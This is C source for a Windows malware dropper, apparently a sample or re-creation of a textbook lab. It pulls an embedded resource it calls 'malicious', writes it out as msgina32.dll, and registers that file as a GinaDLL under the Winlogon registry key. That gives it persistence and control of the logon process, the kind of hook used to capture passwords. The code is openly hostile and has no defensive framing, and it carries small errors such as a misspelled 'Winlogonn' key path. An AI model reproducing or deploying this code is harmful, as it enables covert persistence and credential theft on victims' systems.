#include <Windows.h>
#include <stdio.h>

#include "resource.h"

#pragma warning( disable : 6067 )
#pragma warning( disable : 4996 )

LPVOID __cdecl LoadMaliciousResource(HMODULE hModule)
{
	HRSRC hResInfo = NULL;
	HGLOBAL hResData = NULL;
	PVOID buffer = NULL;
	DWORD dwSize = 0;
	LPVOID mem_alloc = NULL;
	FILE* stream_file = NULL;

	if (!hModule)
		return 0;

	hResInfo = FindResourceA(hModule, MAKEINTRESOURCEA(IDR_RCDATA1), RT_RCDATA);
	if (!hResInfo)
		return 0;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData)
	{
		buffer = LockResource(hResData);
		if (buffer)
		{
			dwSize = SizeofResource(hModule, hResInfo);
			if (dwSize)
			{
				mem_alloc = VirtualAlloc(NULL, dwSize, 4096, PAGE_READWRITE);
				if (mem_alloc)
				{
					memcpy(mem_alloc, buffer, dwSize);
					stream_file = fopen("msgina32.dll", "wb");
					fwrite(buffer, 1, dwSize, stream_file);
					fclose(stream_file);
				}
			}
		}
	}
	FreeResource(hResInfo);
	return mem_alloc;
}

int SetPersistence(PBYTE lpData, DWORD cbData)
{
	HKEY hKey = NULL;

	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogonn", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL))
		return 1;

	if (RegSetValueExA(hKey, "GinaDLL", 0, REG_SZ, lpData, cbData))
	{
		CloseHandle(hKey);
		return 1;
	}
	else
	{
		printf_s("WORKING");
		CloseHandle(hKey);
		return 0;
	}
}

int main(void)
{
	HMODULE hModule = NULL;
	char* FileName[272];
	char* path;
	int MaliciousRsrc = 0;

	hModule = GetModuleHandleA(NULL);
	memset(FileName, 0, 270);

	/* ---- Load Resource ---- */
	MaliciousRsrc = LoadMaliciousResource(hModule);

	GetModuleFileNameA(NULL, FileName, 270);
	path = strrchr(FileName, '\\');
	*path = 0;
	strcat(FileName, "\\msgina32.dll");

	/* ---- Set Persistence ---- */
	SetPersistence((PBYTE)FileName, 260);

	return 0;
}